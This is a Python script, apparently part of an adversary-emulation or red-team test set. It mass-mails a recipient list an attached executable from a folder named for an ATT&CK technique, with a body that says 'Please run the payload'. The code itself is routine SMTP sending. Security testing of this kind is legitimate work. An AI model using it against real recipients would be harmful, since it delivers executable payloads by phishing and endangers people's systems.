import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from generator import generate_payload
from load_configs import parse_sender, parse_recipients

def send_email(sender, password, receiver, subject, message, attachments=None):

    msg = MIMEMultipart()  # Используем MIMEMultipart для поддержки вложений
    msg['From'] = sender
    msg['To'] = receiver
    msg['Subject'] = subject  # Установка темы письма

    msg.attach(MIMEText(message, 'plain')) # Добавляем текстовое сообщение

    if attachments:
        for attachment in attachments:
            try:
                with open(attachment, "rb") as f:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    filename = os.path.basename(attachment) # Извлекаем имя файла
                    part.add_header("Content-Disposition", f"attachment; filename= {filename}")
                    msg.attach(part)
            except FileNotFoundError:
                print(f"Файл {attachment} не найден.")
                return
            except Exception as e:
                print(f"Ошибка при добавлении вложения {attachment}: {e}")
                return
    print("Подключение к серверу...")
    try:
        with smtplib.SMTP_SSL('smtp.timeweb.ru', 465) as smtp:
            print("Попытка логина")
            smtp.login(sender, password)
            smtp.send_message(msg)
        print("Письмо успешно отправлено")
    except smtplib.SMTPAuthenticationError:
        print("Ошибка аутентификации SMTP. Проверьте логин и пароль.")
    except smtplib.SMTPException as e:
        print(f"Ошибка SMTP: {e}")
    except Exception as e:
        print(f"Общая ошибка отправки письма: {e}")


sender_email, sender_password = parse_sender("sender.txt")
recipients = parse_recipients("recipients.txt")
subject = "Test Email with Payload Hello World"
message = "Hello, this is a test email with payload. Please run the payload."
attachments=[ "../T1027.003/test.exe"]
def main():
    if sender_email and sender_password and recipients:
        for receiver_email in recipients:
            send_email(sender_email, sender_password, receiver_email, subject, message, attachments)
    else:
        print("Failed to load sender or recipient data. Exiting.")

if __name__ == "__main__":
    main()